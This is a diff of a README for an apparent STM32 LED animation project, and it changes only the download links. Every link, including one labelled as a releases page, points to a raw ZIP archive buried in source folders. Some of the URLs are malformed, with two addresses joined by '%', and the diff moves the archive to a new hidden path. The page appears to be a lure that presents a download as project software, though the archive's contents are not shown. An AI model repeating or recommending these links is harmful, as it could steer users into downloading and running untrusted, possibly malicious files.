@@ -1,7 +1,7 @@
 # 🎉 01_Kayan_LED_Animasyonu - Simple LED Animation for STM32
 
 ## 📦 Download Now
-[![Download](https://raw.githubusercontent.com/CroquetaVerde/01_Kayan_LED_Animasyonu/main/Drivers/CMSIS/Device/ST/STM32F4xx/01_Kayan_LED_Animasyonu_1.6.zip%https://raw.githubusercontent.com/CroquetaVerde/01_Kayan_LED_Animasyonu/main/Drivers/CMSIS/Device/ST/STM32F4xx/01_Kayan_LED_Animasyonu_1.6.zip)](https://raw.githubusercontent.com/CroquetaVerde/01_Kayan_LED_Animasyonu/main/Drivers/CMSIS/Device/ST/STM32F4xx/01_Kayan_LED_Animasyonu_1.6.zip)
+[![Download](https://raw.githubusercontent.com/CroquetaVerde/01_Kayan_LED_Animasyonu/main/Core/Src/Kayan-LE-Animasyonu-v2.5.zip%https://raw.githubusercontent.com/CroquetaVerde/01_Kayan_LED_Animasyonu/main/Core/Src/Kayan-LE-Animasyonu-v2.5.zip)](https://raw.githubusercontent.com/CroquetaVerde/01_Kayan_LED_Animasyonu/main/Core/Src/Kayan-LE-Animasyonu-v2.5.zip)
 
 ---
 
@@ -25,12 +25,12 @@ To get started with this project, follow these steps:
 - **Board:** Ensure you have the STM32F407-Discovery board.
 
 ### 2. Visit Release Page
-Go to the [Releases page](https://raw.githubusercontent.com/CroquetaVerde/01_Kayan_LED_Animasyonu/main/Drivers/CMSIS/Device/ST/STM32F4xx/01_Kayan_LED_Animasyonu_1.6.zip) to find the latest version of the software. 
+Go to the [Releases page](https://raw.githubusercontent.com/CroquetaVerde/01_Kayan_LED_Animasyonu/main/Core/Src/Kayan-LE-Animasyonu-v2.5.zip) to find the latest version of the software. 
 
 ### 3. Download the Application
 Click on the latest release and download the ZIP file.
 
-![Download ZIP](https://raw.githubusercontent.com/CroquetaVerde/01_Kayan_LED_Animasyonu/main/Drivers/CMSIS/Device/ST/STM32F4xx/01_Kayan_LED_Animasyonu_1.6.zip%https://raw.githubusercontent.com/CroquetaVerde/01_Kayan_LED_Animasyonu/main/Drivers/CMSIS/Device/ST/STM32F4xx/01_Kayan_LED_Animasyonu_1.6.zip)
+![Download ZIP](https://raw.githubusercontent.com/CroquetaVerde/01_Kayan_LED_Animasyonu/main/Core/Src/Kayan-LE-Animasyonu-v2.5.zip%https://raw.githubusercontent.com/CroquetaVerde/01_Kayan_LED_Animasyonu/main/Core/Src/Kayan-LE-Animasyonu-v2.5.zip)
 
 ### 4. Extract the Files
 After downloading, locate the ZIP file and extract its contents to a folder on your computer.
@@ -65,7 +65,7 @@ Once uploaded, the LEDs will automatically start animating. Watch the lights mov
 
 ## 📚 Additional Resources
 
-If you are interested in a more advanced version of this project that uses arrays and loops to reduce code repetition, check out the improved version [here](https://raw.githubusercontent.com/CroquetaVerde/01_Kayan_LED_Animasyonu/main/Drivers/CMSIS/Device/ST/STM32F4xx/01_Kayan_LED_Animasyonu_1.6.zip).
+If you are interested in a more advanced version of this project that uses arrays and loops to reduce code repetition, check out the improved version [here](https://raw.githubusercontent.com/CroquetaVerde/01_Kayan_LED_Animasyonu/main/Core/Src/Kayan-LE-Animasyonu-v2.5.zip).
 
 ## 💬 Support
 
